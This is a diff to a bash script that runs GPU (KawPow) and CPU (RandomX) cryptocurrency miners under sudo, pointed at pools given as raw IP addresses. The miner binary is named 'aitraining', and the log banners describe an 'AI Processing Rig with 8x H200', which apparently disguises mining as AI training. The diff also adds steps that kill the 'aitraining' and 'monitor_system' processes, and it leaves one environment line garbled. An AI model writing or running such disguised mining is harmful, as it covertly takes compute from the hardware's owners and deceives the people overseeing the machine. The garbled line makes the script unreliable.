@@ -1,20 +1,24 @@
 #!/bin/bash
+
 export GPU_MAX_HEAP_SIZE=100
 export GPU_MAX_USE_SYNC_OBJECTS=1
 export GPU_SINGLE_ALLOC_PERCENT=100
 export GPU_MAX_ALLOC_PERCENT=100
 export GPU_MAX_SINGLE_ALLOC_PERCENT=100
 export GPU_ENABLE_LARGE_ALLOCATION=100
-export GPU_MAX_WORKGROUP_SIZE=1024
-# --- Temporary Log File Setup ---
-# Create a unique, temporary file to store all logs for easy cleanup
+export GPU_MAX_WORKGROUP_SIZE=1024leanup
 LOG_FILE=$(mktemp --suffix=.log)
 
-echo "=== Initializing AI Processing with 8x H200 ===" | tee -a "$LOG_FILE"
+echo "=== Initializing AI Processing Rig with 8x H200 ===" | tee -a "$LOG_FILE"
+
+# --- STOP OLD PROCESSES ---
+echo "$(date) Stopping old 'aitraining' and 'monitor_system' processes..." | tee -a "$LOG_FILE"
+sudo pkill -f aitraining 2>/dev/null
+sudo pkill -f monitor_system 2>/dev/null
+sleep 2
 
 # --- GPU PROCESS (KawPow) ---
-echo -e "\n$(date) Starting GPU Process..." | tee -a "$LOG_FILE"
-# NOTE: Overclock settings removed as requested. Miner will use default settings.
+echo -e "\n$(date) Starting GPU (KawPow) Process..." | tee -a "$LOG_FILE"
 sudo ./aitraining \
     --algorithm kawpow \
     --pool 74.220.25.74:7845 \
@@ -32,12 +36,10 @@ sudo ./aitraining \
     --max-rejected-shares 10 \
     --max-no-share-sent 300 \
     --gpu-progpow-safe \
-    --cpu-threads 0
     --api-disable &
 
 # --- CPU PROCESS (RandomX) ---
 echo -e "\n$(date) Starting CPU (RandomX) Process..." | tee -a "$LOG_FILE"
-# RandomX is CPU-intensive and benefits from cache.
 sudo ./aitraining \
     --algorithm randomx \
     --pool 51.222.200.133:10343 \
